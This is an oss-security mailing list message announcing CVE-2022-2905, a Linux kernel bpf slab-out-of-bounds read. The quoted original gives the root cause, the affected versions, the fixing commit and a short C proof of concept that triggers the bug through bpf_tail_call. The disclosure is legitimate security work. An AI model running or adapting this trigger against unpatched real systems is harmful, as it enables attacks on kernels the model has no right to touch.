Received: (qmail 9408 invoked by uid 550); 26 Aug 2022 18:56:15 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 8043 invoked from network); 26 Aug 2022 16:23:52 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=uci-edu.20210112.gappssmtp.com; s=20210112;
        h=to:subject:message-id:date:from:in-reply-to:references:mime-version
         :from:to:cc;
        bh=ZGtIxLSNGCF1MvZXf9JMneX+7NnSP63Kuv5z/roMoIk=;
        b=BmQKRC1CO1B4q+nnYgY8pDrP6n8DYOLLBXbzoxDsShJPQ1Ku98z9imEXgCJlmOnz/n
         JIENjOiPBjpSVAPE5zR/JYIBxhkwFblKmN1/E0jRtkik3CzjG+qohFcUveCnlRgRaHjD
         hMbIDsxaVm+nohZC96xdm9ZsuRjb4gt4PKd6d9JWASx59qegd+nM1STfbCIL0adR7GsS
         xsS2LBfSN0Emh4yKat40uXVVImybFcyXff0kyJOFNPd7c9s6iIWO3CiyDYl8VtDdQ5hz
         hzcP4cKE4pWL2WUTDb1tQVq4IplHpfxXfF9bYfek7tQLqJ69JFdTG8x24CE0k2iLz9Rd
         CswQ==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20210112;
        h=to:subject:message-id:date:from:in-reply-to:references:mime-version
         :x-gm-message-state:from:to:cc;
        bh=ZGtIxLSNGCF1MvZXf9JMneX+7NnSP63Kuv5z/roMoIk=;
        b=2yUBLSsxZJONSfl98uu7pYeRjCV+MWFGnZgaAJn1n1jtAvNJtJjAZqpeM7W6LhGT6h
         9KnVpgfbQIYeRye9AWXY4mOkh7pZQpjqkrprf1Od0igzUdCD1rTxY4pxi+40NsIc7e50
         jqUtO5vLEXZg70Rh5BuK1Rs6hr/QgFg8t3vyHtkjUFMkP96iB+tC0zFRRnv5iMQWnqyH
         cJzN9NKke6k3LvnnAN8nAsmtI78mXpmLOF1SAv/vON1cCI0GxZSechudwEoQFjc7iyoG
         M2XH7QSyrb8sTR8ZRdaAsO7S9SP9IJWL03iEiTyTCfzQ95RcUjRZgUhsUvdkoC2q6DLV
         dcsw==
X-Gm-Message-State: ACgBeo3Hoy3cq/v/2GLAro8MKxT7ZKmsROTrgLP2c4WFU4woTHxdaYGZ
	EoY4XfFDNFzrAZx9rFdO5a5GD0XbfV5w5Krqch7dHL6p6Cfw9uBR
X-Google-Smtp-Source: AA6agR7PvL+BxGpjTIt2eA1yLGLnLdN5hM/1T0lPX8K+4W63ai6hUjhRzN93knEGnDMwww1fk6lox6o4eedGSRDlqDQ=
X-Received: by 2002:a5d:9651:0:b0:684:8fe1:35e6 with SMTP id
 d17-20020a5d9651000000b006848fe135e6mr4025573ios.6.1661531019866; Fri, 26 Aug
 2022 09:23:39 -0700 (PDT)
MIME-Version: 1.0
References: <CABcoxUaK1ipxFP3==j+57mWXYadiHNd_eNgzKSxJ6Y0cM4WnyA@mail.gmail.com>
In-Reply-To: <CABcoxUaK1ipxFP3==j+57mWXYadiHNd_eNgzKSxJ6Y0cM4WnyA@mail.gmail.com>
From: Hsin-Wei Hung <hsinweih@uci.edu>
Date: Sat, 27 Aug 2022 00:23:03 +0800
Message-ID: <CABcoxUZd4kYgG6A=5U4PAA72Y84XiWaM=Kp2Pfu4vbOMU-BigA@mail.gmail.com>
To: oss-security@lists.openwall.com
Content-Type: multipart/alternative; boundary="000000000000390a5605e72756bf"
Subject: [oss-security] Re: Linux kernel slab-out-of-bound read in bpf

--000000000000390a5605e72756bf
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: quoted-printable

CVE-2022-2905 has been assigned to this issue.

Thanks,
Hsin-Wei

On Fri, Aug 26, 2022 at 7:07 AM Hsin-Wei Hung <hsinweih@uci.edu> wrote:

> Hi,
>
> We found an issue in the bpf subsystem of the Linux kernel that can cause
> a slab-out-of-bound read. A bpf program calling bpf_tail_call with an ind=
ex
> larger than the max_entries can potentially pass the verifier. After that,
> it will cause an out-of-bound access in the x86 JIT compiler. The root
> cause is that tnum_range over-approximates the range of concrete values.
>
> Affected kernel starts from v5.5 since commit, d2e4c1e6c294 (=E2=80=9Cbpf:
> Constant map key tracking for prog array pokes=E2=80=9D)
>
> It has been fixed in commit, a657182a5c51 ("bpf: Don't use tnum_range on
> array range checking for poke descriptors") in bpf/bpf.git.
>
> The following code is a bpf PoC that can trigger the bug.
>
> #include "/usr/local/include/vmlinux.h"
> #include "/usr/include/bpf/bpf_helpers.h"
>
> #define __uint(name, val) int (*name)[val]
> #define __type(name, val) typeof(val) *name
> #define __array(name, val) typeof(val) *name[]
>
> #define SEC(name) \
>         _Pragma("GCC diagnostic push")                                  \
>         _Pragma("GCC diagnostic ignored \"-Wignored-attributes\"")      \
>         __attribute__((section(name), used))                            \
>         _Pragma("GCC diagnostic pop")
>
> #define DEFINE_BPF_MAP(the_map, TypeOfMap, MapFlags, TypeOfKey,
> TypeOfValue, MaxEntries) \
>         struct {                                                        \
>             __uint(type, TypeOfMap);                                    \
>             __uint(map_flags, (MapFlags));                              \
>             __uint(max_entries, (MaxEntries));                          \
>             __type(key, TypeOfKey);                                     \
>             __type(value, TypeOfValue);                                 \
>         } the_map SEC(".maps");
>
> DEFINE_BPF_MAP(map_0, BPF_MAP_TYPE_PROG_ARRAY, 0, uint32_t, uint32_t, 36);
> SEC("cgroup/sock_create")
> int func(struct bpf_sock *ctx) {
>         int64_t v0 =3D 49;
>         bpf_tail_call(ctx, &map_0, v0);
>         return 0;
> }
> char _license[] SEC("license") =3D "GPL";
>
>
> Thanks,
> Hsin-Wei
>
>
>

--000000000000390a5605e72756bf--
